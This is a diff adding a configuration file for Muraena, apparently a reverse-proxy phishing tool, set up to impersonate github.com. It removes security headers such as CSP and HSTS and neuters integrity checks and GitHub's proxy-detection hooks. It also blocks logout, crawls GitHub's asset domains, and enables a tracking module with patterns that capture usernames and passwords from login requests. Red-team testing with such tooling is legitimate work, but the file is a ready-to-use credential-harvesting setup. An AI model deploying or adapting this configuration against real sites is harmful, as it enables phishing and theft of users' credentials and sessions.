@@ -1,0 +1,139 @@
+[proxy]
+phishing = "test.muraena"
+destination = "github.com"
+skipContentType = [ "font/*", "image/*" ]
+
+[proxy.listener]
+ip = "0.0.0.0"
+port = 443
+# portmapping = "8443:443"
+
+[proxy.listener.HTTPtoHTTPS]
+enabled = true
+HTTPport = 8080
+
+[proxy.transform.base64]
+enabled = true
+padding = [ "=", "." ]
+
+[proxy.transform.request]
+header = [ "Cookie", "Referer", "Origin", "X-Forwarded-For" ]
+
+[proxy.transform.response]
+header = [
+    "Location",
+    "WWW-Authenticate",
+    "Origin",
+    "Set-Cookie",
+    "Access-Control-Allow-Origin"
+]
+custom = [
+  [ "integrity=\"", "no-integrity=\"" ],
+  [ "js-proxy-site-detection-payload", "" ],
+  [ "expected-hostname", "" ],
+  [ "html-safe-nonce", "" ]
+]
+
+[proxy.remove.request]
+header = [ "X-Forwarded-For" ]
+
+[proxy.remove.response]
+header = [
+    "Content-Security-Policy",
+    "Content-Security-Policy-Report-Only",
+    "Strict-Transport-Security",
+    "X-XSS-Protection",
+    "X-Content-Type-Options",
+    "X-Frame-Options",
+    "Referrer-Policy",
+    "X-Forwarded-For"
+]
+
+[[proxy.drop]]
+url = "/logout"
+redirectTo = "https://example.com"
+
+[proxy.log]
+enabled = true
+filePath = "muraena.log"
+
+
+#
+#
+#
+[tls]
+enabled = true
+expand = false
+certificate = "./config/cert.pem"
+key = "./config/privkey.pem"
+root = "./config/fullchain.pem"
+
+
+#
+#
+#
+[crawler]
+enabled = true
+depth = 0
+upto = 5
+externalOriginPrefix = "muraena-"
+externalOrigins = [
+  "*.githubassets.com",
+  "*.githubusercontent.com",
+  "*.github.io",
+  "*.githubapp.com",
+  "github-cloud.s3.amazonaws.com",
+  "octocaptcha.com",
+  "stats.g.doubleclick.net",
+  "github.community",
+  "githubstatus.com",
+  "githubengineering.com"
+]
+
+
+#
+#
+#
+[necrobrowser]
+enabled = false
+endpoint = "http://necrobrowser.url/xyz"
+profile = "./config/instrument.necro"
+
+
+#
+#
+#
+[staticServer]
+enabled = false
+port = 8080
+localPath = "./static/"
+urlPath = "/evilpath/"
+
+
+#
+# TRACKING MODULE
+#
+[tracking]
+enabled = true
+type = ""
+identifier = "_gat"
+domain = ""
+ipSource = ""
+regex = "[a-zA-Z0-9]{5}"
+params = [ "login_email", "login_password" ]
+
+[tracking.urls]
+credentials = [ "/credentials_path" ]
+authSession = [ "/auth_session_path" ]
+
+[[tracking.patterns]]
+label = "Username"
+matching = "login_email"
+start = "login_email="
+end = "&"
+
+[[tracking.patterns]]
+label = "Password"
+matching = "login_password"
+start = "&login_password="
+end = "&"
